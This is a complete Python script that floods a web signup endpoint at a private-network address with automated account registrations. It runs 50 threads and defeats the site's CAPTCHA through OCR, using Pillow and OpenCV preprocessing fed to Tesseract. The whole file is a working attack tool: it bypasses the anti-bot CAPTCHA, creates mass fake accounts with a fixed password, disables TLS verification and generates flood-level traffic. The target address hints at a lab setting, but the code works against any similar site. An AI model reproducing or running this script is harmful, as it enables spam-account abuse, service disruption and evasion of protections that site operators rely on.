import requests
import random
import string
import threading
import time
import urllib3
import io
import shutil
import sys

# --- IMPORT DEPENDENCIES SAFELY ---
try:
    from PIL import Image, ImageFilter, ImageOps
    import pytesseract
    import io
    import cv2
    import numpy as np
except ImportError:
    print("[-] ERROR: Missing Python libraries.")
    print("    Run: pip install pytesseract pillow opencv-python-headless numpy")
    sys.exit(1)

# --- CONFIGURATION ---
TARGET_URL = "https://10.10.10.3/signup"
CAPTCHA_URL = "https://10.10.10.3/captcha/image"
HOST_HEADER = "web.sun.dmz"
THREAD_COUNT = 50

# Disable SSL Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_system_dependencies():
    """Verifies that the Tesseract binary is installed on the OS."""
    if shutil.which('tesseract') is None:
        print("[-] FATAL ERROR: 'tesseract' binary not found in PATH.")
        print("    The Python library is installed, but the OCR engine is missing.")
        print("    -> Alpine: apk add tesseract-ocr")
        print("    -> Debian: apt install tesseract-ocr")
        sys.exit(1)
    print("[+] System check: Tesseract OCR binary found.")

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def solve_captcha_with_preprocessing(image_bytes):
    try:
        # 1. Load Image
        img = Image.open(io.BytesIO(image_bytes))
        
        # 2. Convert to Grayscale
        img = img.convert('L')
        
        # 3. Scale Up (Crucial for Tesseract accuracy)
        # Tesseract works best on text approx 30px high. We double the size.
        width, height = img.size
        img = img.resize((width * 2, height * 2), Image.Resampling.LANCZOS)
        
        # 4. Apply Median Filter
        # This is the "Magic" step. It looks at neighboring pixels and picks the median.
        # Since noise dots are usually 1 pixel wide, this erases them while keeping thick text.
        img = img.filter(ImageFilter.MedianFilter(size=3))
        
        # 5. Binarization (Thresholding)
        # Force pixels to be either pure black or pure white.
        # We assume text is dark (< 160) and background/noise is light (> 160).
        threshold = 160
        img = img.point(lambda p: 255 if p > threshold else 0)
        
        # 6. Configure Tesseract
        # --psm 8: Treat the image as a single word.
        # whitelist: Tell Tesseract to ONLY look for uppercase letters and numbers.
        custom_config = r'--psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        
        result = pytesseract.image_to_string(img, config=custom_config)
        
        # Clean result just in case
        return ''.join(filter(str.isalnum, result)).strip().upper()
        
    except Exception as e:
        print(f"[!] Preprocessing Error: {e}")
        return ""
    

def solve_captcha_opencv(image_bytes):
    # Convert bytes to numpy array
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)
    
    # 1. Thresholding (Otsu's method determines optimal threshold automatically)
    # This turns the image into pure black and white
    _, img = cv2.threshold(img, 0, 255, cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU)

    # 2. Remove Noise (Morphological Opening)
    # This removes small white dots (noise) from the text
    kernel = np.ones((2,2), np.uint8)
    img = cv2.morphologyEx(img, cv2.MORPH_OPEN, kernel)

    # 3. Dilation (Thicken the text)
    # Makes the letters connect better if the noise removal ate some parts
    img = cv2.dilate(img, kernel, iterations=1)

    # 4. Invert back (Tesseract prefers black text on white bg)
    img = cv2.bitwise_not(img)
    
    # 5. Resize (Scale up)
    img = cv2.resize(img, None, fx=2, fy=2, interpolation=cv2.INTER_CUBIC)

    # Solve
    custom_config = r'--psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    result = pytesseract.image_to_string(img, config=custom_config)
    
    return ''.join(filter(str.isalnum, result)).strip().upper()


def attack_worker(thread_id):
    # Create session per thread
    session = requests.Session()
    session.verify = False
    # Manually set the Host header to pass the server's routing checks
    session.headers.update({"Host": HOST_HEADER})

    # Debug print to prove thread is running
    # print(f"[*] Thread {thread_id} started.")

    while True:
        try:
            # 1. Download the Image
            # We explicitly handle the request to ensure traffic is generated
            try:
                r_img = session.get(CAPTCHA_URL, timeout=5)
                if r_img.status_code != 200:
                    print(f"[-] Thread {thread_id}: Failed to get image (Status {r_img.status_code})")
                    time.sleep(1)
                    continue
            except Exception as e:
                # If we fail here, the server is down or unreachable
                print(f"[-] Thread {thread_id}: Connection Error: {e}")
                time.sleep(5)
                continue

            # 2. Solve the CAPTCHA
            image_bytes = r_img.content
            captcha_guess = solve_captcha_with_preprocessing(image_bytes)
            if not captcha_guess or len(captcha_guess) != 6:
                # Fallback to OpenCV method if preprocessing fails
                captcha_guess = solve_captcha_opencv(image_bytes)
            if not captcha_guess or len(captcha_guess) != 6:
                print(f"[-] Thread {thread_id}: OCR Failed to produce valid CAPTCHA.")
                continue

            # 3. Submit the Signup
            username = f"bot_{generate_random_string(8)}"
            password = "Password123!@"

            r_post = session.post(TARGET_URL, data={
                "username": username,
                "password": password,
                "captcha_answer": captcha_guess
            }, timeout=5)

            # 4. Check Result
            if r_post.status_code == 302 or "dashboard" in r_post.text:
                print(f"[+] SUCCESS: Solved '{captcha_guess}' -> Created {username}")
            
            # Optional: Uncomment to see failed attempts (it will be spammy)
            # else:
            #    print(f"[-] Failed: '{captcha_guess}'")

        except Exception as e:
            print(f"[!] Critical Thread Error: {e}")
            time.sleep(1)

def start_attack():
    # 1. Check if Tesseract is installed
    check_system_dependencies()
    
    print(f"--- Starting OCR-Based Flood on {TARGET_URL} ---")
    print(f"--- Threads: {THREAD_COUNT} ---")

    threads = []
    for i in range(THREAD_COUNT):
        t = threading.Thread(target=attack_worker, args=(i,))
        t.daemon = True 
        t.start()
        threads.append(t)
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")

if __name__ == "__main__":
    start_attack()